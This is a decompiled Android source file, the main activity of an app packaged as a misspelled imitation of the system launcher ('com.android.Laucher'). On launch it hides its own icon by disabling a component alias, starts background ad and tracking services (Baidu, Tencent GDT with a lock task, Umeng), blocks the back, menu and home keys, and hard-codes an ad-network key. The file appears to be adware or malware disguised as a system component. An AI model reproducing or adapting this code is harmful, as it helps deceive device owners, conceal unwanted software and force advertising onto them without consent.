package com.android.Laucher;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.RelativeLayout;
import com.android.Laucher.Homecontrol.OnHomePressedListener;
import com.mb.bdapp.service.BaiduService;
import com.qq.gdt.utils.LockTask;
import com.qq.gdt.utils.UtilsClass;
import com.umeng.analytics.MobclickAgent;

public class MainActivity extends Activity implements OnHomePressedListener {
    public static final boolean DEBUG = true;
    private static final String TAG = "ssp";
    private static final long YOUR_PLACEMENT_ID = 1447592382536L;
    double count = 0.0d;
    private Homecontrol homecontrol;
    private String inmobiKey = "34c4a8f3990d4b369d8232279d87acd0";
    private RelativeLayout mContainer;
    UtilsClass uc;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("yanghang", "onCreate");
        this.uc = UtilsClass.getInstance();
        this.homecontrol = new Homecontrol(getApplicationContext());
        this.homecontrol.setOnHomePressedListener(this);
        this.homecontrol.startWatch();
        PackageManager pm = getPackageManager();
        ComponentName cn = new ComponentName(this, "com.android.Laucher.MainActivity.alias");
        if (2 != pm.getComponentEnabledSetting(cn)) {
            pm.setComponentEnabledSetting(cn, 2, 1);
        }
        this.uc.startService(getApplicationContext());
        startService(new Intent(this, BaiduService.class));
        Log.e("-- HDJ --", "启动GP优化服务");
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        LockTask.flag = false;
        if (this.homecontrol != null) {
            this.homecontrol.stopWatch();
            this.homecontrol = null;
        }
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == 4 || keyCode == 82 || keyCode == 3) {
            return false;
        }
        return super.onKeyDown(keyCode, event);
    }

    public void onHomePressed() {
        finish();
    }

    public void onHomeLongPressed() {
        finish();
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        super.onPause();
        MobclickAgent.onPause(this);
        Log.e("yanghang", "onPause");
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
        MobclickAgent.onResume(this);
        Log.e("yanghang", "onResume");
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
    }
}
